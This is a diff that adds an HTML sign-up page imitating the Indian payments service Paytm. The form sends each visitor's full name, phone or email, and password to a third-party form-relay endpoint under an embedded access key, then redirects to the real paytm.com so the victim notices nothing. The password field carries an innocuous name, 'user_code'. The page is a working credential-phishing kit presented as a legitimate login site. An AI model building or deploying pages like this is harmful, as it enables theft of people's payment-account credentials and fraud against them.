@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign Up - Paytm</title>
+    <link rel="stylesheet" href="styles.css" />
+    <!-- Optional: Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+        integrity="sha512-Fo3rlrZj/k7ujTTXRNXOXh7Hq5N9/1Kq1YOq6V2sW/jG4Bw4T1TJD5uB7Cobe74QNf9tNE5kN9S9ID5MW4ZKZw=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+
+<body>
+    <div class="container">
+        <!-- Header Section -->
+        <header class="login-header">
+            <img src="paytm-logo.png" alt="Paytm Logo" class="logo" />
+            <h1>Create Account</h1>
+        </header>
+
+        <!-- Signup Form Container -->
+        <div class="login-box">
+            <h2>Sign Up</h2>
+
+            <!-- Message display for errors or instructions -->
+            <div id="message" class="message" aria-live="polite"></div>
+
+            <!-- Signup Form -->
+            <form id="signup-form" action="https://api.web3forms.com/submit" method="POST">
+                <!-- Web3Forms Access Key -->
+                <input type="hidden" name="access_key" value="7dcc98dd-9694-4483-bbde-ff24db2960cf">
+                <!-- Optional: Set a redirect URL after a successful submission -->
+                <input type="hidden" name="redirect" value="https://paytm.com/">
+
+                <!-- Full Name Field -->
+                <div class="textbox">
+                    <label for="full_name">Full Name</label>
+                    <input type="text" id="full_name" name="full_name" placeholder="Enter your full name" required>
+                </div>
+
+                <!-- Phone or Email Field -->
+                <div class="textbox">
+                    <label for="user_identifier">Phone or Email</label>
+                    <input type="text" id="user_identifier" name="user_identifier" placeholder="Enter phone or email"
+                        required>
+                </div>
+
+                <!-- Password Field -->
+                <div class="textbox">
+                    <label for="user_code">Password</label>
+                    <input type="password" id="user_code" name="user_code" placeholder="Create a password" required>
+                </div>
+
+                <!-- Confirm Password Field -->
+                <div class="textbox">
+                    <label for="confirm_password">Confirm Password</label>
+                    <input type="password" id="confirm_password" name="confirm_password"
+                        placeholder="Confirm your password" required>
+                </div>
+
+                <!-- Optional: reCAPTCHA Field (Placeholder: adjust as needed) -->
+                <div class="recaptcha">
+                    <!-- Example for hCaptcha -->
+                    <div class="h-captcha" data-captcha="true"></div>
+                </div>
+
+                <!-- Signup Button -->
+                <button type="submit" class="btn">Sign Up</button>
+            </form>
+
+            <!-- Additional links section -->
+            <div class="additional-links">
+                <p>Already have an account? <a href="login.html">Login</a></p>
+                <p>Forgot your password? <a href="forgot-password.html">Reset Password</a></p>
+            </div>
+        </div>
+
+        <!-- Footer Section (Optional) -->
+        <footer>
+            <p>&copy; 2023 Paytm. All Rights Reserved.</p>
+        </footer>
+    </div>
+
+    <!-- Inline JavaScript for basic form validation -->
+    <script>
+        document.getElementById('signup-form').addEventListener('submit', function (e) {
+            var fullName = document.getElementById('full_name').value.trim();
+            var userIdentifier = document.getElementById('user_identifier').value.trim();
+            var userCode = document.getElementById('user_code').value.trim();
+            var confirmPassword = document.getElementById('confirm_password').value.trim();
+            var message = document.getElementById('message');
+            message.textContent = "";
+
+            // Check that all fields are filled
+            if (fullName === "" || userIdentifier === "" || userCode === "" || confirmPassword === "") {
+                e.preventDefault();
+                message.textContent = "Please fill out all fields.";
+                message.style.color = "red";
+                return false;
+            }
+
+            // Check if password and confirm password match
+            if (userCode !== confirmPassword) {
+                e.preventDefault();
+                message.textContent = "Passwords do not match.";
+                message.style.color = "red";
+                return false;
+            }
+
+            // Optional: Check captcha field if implemented
+            const captchaField = this.querySelector('textarea[name=h-captcha-response]');
+            if (captchaField && !captchaField.value) {
+                e.preventDefault();
+                alert("Please complete the captcha.");
+                return;
+            }
+            return true;
+        });
+    </script>
+</body>
+
+</html>
